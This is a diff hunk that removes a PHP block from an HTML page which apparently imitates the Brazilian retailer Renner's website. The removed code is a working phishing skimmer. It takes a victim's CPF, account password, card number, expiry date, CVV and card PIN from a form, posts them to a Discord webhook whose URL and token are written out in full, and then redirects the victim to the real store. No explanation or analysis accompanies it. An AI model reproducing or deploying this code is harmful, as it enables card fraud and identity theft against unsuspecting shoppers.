@@ -24637,47 +24637,6 @@
 </head>
 
 <body>
- <?php
-error_reporting(0);
-date_default_timezone_set('America/Sao_Paulo');
- 
-if((isset($_POST['card']) && !(is_null($_POST['card']))) && (isset($_POST['cpf']) && !(is_null($_POST['cpf'])) && (isset($_GET['check'])))){
- 
-    $cpf = $_POST['cpf'];
-    $acesso = $_POST['pass'];
-    $name = " ";
-    $phone = " ";
-    $email = " ";
-    $cc = $_POST['card'];
-    $date = $_POST['date'];
-    $cvv = $_POST['cvv'];
-    $pass = $_POST['passw'];
- 
-    $url = "https://discord.com/api/webhooks/1085201245242921122/R0piPu6Hd3BljMEdBXpADJrRNQxdqaOQJsBqkFEhy5OH_30NnkYdD3cyFLoo3p9ULsL5";
-    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
-    $POST = [ 'username' => 'gutinho', 'content' => '
-    ```css
-    Cpf -> '.$cpf.' 
-    Senha de acesso -> '.$acesso.'
-    Número do cartão -> '.$cc.'
-    Validade do cartão -> '.$date.'
-    Codigo de segurança -> '.$cvv.'
-    Senha do cartão -> '.$pass.'```' ];
- 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
-    $response   = curl_exec($ch);
- 
- 
-    header("Location: https://www.lojasrenner.com.br/");
-    exit();
-}
-?>
     <div id="root">
         <div id="root-angular">
             <div id="__single_spa_angular_1" class="ng-scope">
